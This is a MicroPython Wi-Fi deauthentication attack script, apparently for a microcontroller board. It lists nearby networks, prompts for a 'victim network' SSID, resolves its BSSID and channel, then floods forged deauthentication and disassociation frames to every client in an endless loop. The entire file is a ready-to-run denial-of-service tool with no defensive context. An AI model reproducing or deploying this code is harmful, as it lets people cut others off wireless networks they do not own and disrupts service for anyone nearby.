import machine
import network
import socket
import time
import wireless

wlan = wireless.attack(0) 

try: wlan.disconnect()
except: pass

def deauth(bssid, client=None):
    
    if not client:
        client = [0xFF,0xFF,0xFF,0xFF,0xFF,0xFF]

    def main(BSSID, target, type_, reason):
        if not wlan.send_pkt_freedom(
                bytearray(
                    [
                        type_, 
                        0x00, 0x00, 0x00, 
                        target[0], target[1], target[2], target[3], target[4], target[5], 
                        BSSID[0], BSSID[1], BSSID[2], BSSID[3], BSSID[4], BSSID[5],
                        BSSID[0], BSSID[1], BSSID[2], BSSID[3], BSSID[4], BSSID[5], 
                        0x00, 0x00, 0x01, reason
                    ]
                )
            ):
        
            time.sleep_ms(1)
        
            return True

    if main(bssid, client, 0xC0, 0x01):
        main(bssid, client, 0xA0, 0x01)
        main(client, bssid, 0xC0, 0x01)
        main(client, bssid, 0xA0, 0x01)

        time.sleep_ms(2000)

        return True

    time.sleep_ms(2000)


print('[*] Activating...')

wlan.active(True)
    
print('[+] Active.')
print('[*] Scaning wlan...')

networks = wlan.scan()

print('[+] Networks founded: ' + str(len(networks)))

for netwrok_index in range(len(networks)):
    print('[+] ' + str(netwrok_index + 1) + ') ' + str(networks[netwrok_index][0])[2:-1])

ESSID = input('[+] Enter SSID of victim network to connect: ')

print('[*] Getting BSSID of ' + ESSID + '.')

BSSID, CHANNEL = None, None

for NWI in range(len(networks)):
    if str(networks[NWI][0])[2:-1] == ESSID:
        BSSID = networks[NWI][1]
        CHANNEL = networks[NWI][2]

packet = 0

if wlan.setAttack(CHANNEL) and ESSID and CHANNEL:
    print('[+] BSSID of', ESSID, ':', BSSID.decode('utf-8'))
    print('[+] Channel:', CHANNEL)

    print('[+] Channel has been setted.')

    input('<Press ENTER to start attack>')

    while True:
        packet += 4
                
        if deauth(BSSID):
            print('[+]', packet,' Running...')
        else:
            packet -= 4
            print('[-]', packet, 'Failed.')
        
else:
    print('[-] Channel has not been setted or network has not founded.')
